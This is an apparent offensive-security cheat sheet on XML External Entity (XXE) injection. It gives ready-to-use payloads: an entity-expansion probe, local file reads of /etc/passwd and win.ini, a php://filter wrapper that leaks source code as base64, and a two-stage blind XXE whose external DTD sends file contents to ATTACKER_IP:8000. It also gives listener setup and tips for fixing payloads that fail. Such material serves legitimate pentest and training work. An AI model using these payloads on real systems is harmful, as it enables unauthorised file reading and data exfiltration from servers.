# XML External Entity (XXE) Injection

An XML parser is allowed to define entities — named placeholders — and to fetch their content from a URL or a file path. If the application parses XML you supply and the parser has not been told to refuse external entities, you can make the server read its own filesystem and hand you the contents, or make it issue requests to hosts you choose.

Where to look for the sink: anything sending XML in a request body (`Content-Type: application/xml`, `text/xml`), [[Security-Terms#^soap|SOAP]] endpoints, [[Security-Terms#^saml|SAML]] assertions, RSS and sitemap importers, SVG and DOCX and XLSX uploads (all XML inside a zip), and — the one most often missed — a JSON endpoint that also accepts XML if you simply change the `Content-Type` header and reshape the body.

## Confirm the parser resolves entities

```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY probe "XXE-CONFIRMED-7f31"> ]>
<root><name>&probe;</name></root>
```

- `<!DOCTYPE root [ ... ]>` → the inline [[Security-Terms#^dtd|DTD]]. It must come after the XML declaration and before the root element; put it anywhere else and the parser rejects the document outright
- `<!ENTITY probe "...">` → an **internal** entity, defined entirely inside the document. It needs no file access and no network, so it isolates the single question of whether entity expansion is on
- `&probe;` → the reference. Place it inside an element the application actually displays back to you — a name, a title, a description. Placed in a field the response never echoes, a working parser looks identical to a hardened one
- the marker string → make it unique and greppable. `test` will collide with the application's own content and you will not trust what you see
- keep the root element name matching what the application expects, or its own validation rejects the document before the parser reaches your DTD

## Read a file

```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><name>&xxe;</name></root>
```

- `SYSTEM "file:///..."` → an **external** entity. `SYSTEM` is the keyword that makes the parser go and fetch something, and it is the whole vulnerability
- `file:///etc/passwd` → three slashes. `file://` plus a path is host-then-path and silently resolves to nothing; this is the most common reason a working XXE returns empty
- on Windows use `file:///c:/windows/win.ini` — the standard proof file, readable by any account
- `php://filter/convert.base64-encode/resource=index.php` → on a PHP target, the wrapper that makes source code survive. **The step people skip.** A raw source file contains `<` and `&`, which break the XML document the moment they are substituted in, so the parser errors and you conclude the read failed. Base64 has no XML-special characters and comes back intact
- pick a target file that proves the read without needing luck: `/etc/passwd`, `/etc/hostname`, `/proc/self/environ`, `/proc/self/cmdline`, then application config
- files with a `&` or a `<` anywhere in them will break the document even when the read succeeded — always suspect the file before suspecting the vulnerability

## When nothing comes back — blind XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY % ext SYSTEM "http://ATTACKER_IP:8000/x.dtd"> %ext; ]>
<root><name>probe</name></root>
```

Serve `x.dtd` from your own machine, containing the exfiltration definition:

```text
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % wrap "<!ENTITY &#37; send SYSTEM 'http://ATTACKER_IP:8000/?d=%file;'>">
%wrap;
%send;
```

- `%` entities → **parameter** entities, usable only inside a DTD. The reason the payload needs two files is that a parameter entity cannot be referenced inside another entity's value in the internal subset; moving the definition to an external DTD lifts that restriction
- `&#37;` → a literal `%` that the parser expands one level later. Write a bare `%` there and the parser tries to resolve it immediately and errors. **The single most common reason a copy-pasted blind XXE payload fails**
- listener → `python3 -m http.server 8000` in the directory holding `x.dtd`, and watch its log. You need it running *before* you send the request, and you need to be able to read both hits: one fetching the DTD, one carrying the data
- if only the first hit arrives, the parser fetched the DTD but the second stage failed — almost always the `&#37;` above, or a file containing a character that breaks the URL
- a DNS-only variant (`http://` replaced by a hostname lookup) is worth having when outbound TCP is filtered but DNS is not
